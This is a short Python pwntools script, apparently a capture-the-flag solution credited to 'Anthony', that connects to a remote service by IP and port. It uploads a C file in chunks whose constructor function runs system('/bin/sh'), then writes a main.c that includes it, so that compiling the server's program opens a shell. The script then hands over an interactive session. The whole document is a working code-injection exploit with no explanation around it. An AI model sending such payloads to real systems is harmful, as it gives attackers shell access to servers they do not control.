# credits: Anthony


from pwn import *
p = remote('X4.31.154.223', 55018)
context.log_level = 'debug'
payload = [
    b'__attribute__((con',
    b'structor)) void sp',
    b'awn() {system("/b',
    b'in/sh");}'
]

for chunk in payload:
    log.info(chunk)
    p.sendlineafter(b'Filename?', b'solver')
    p.sendlineafter(b'(W)?', b'W')
    p.sendlineafter(b'Contents?', chunk)

payload = [
    b'#include "solver"'
]

for chunk in payload:
    log.info(chunk)
    p.sendlineafter(b'Filename?', b'main.c')
    p.sendlineafter(b'(W)?', b'W')
    p.sendlineafter(b'Contents?', chunk)

p.interactive()
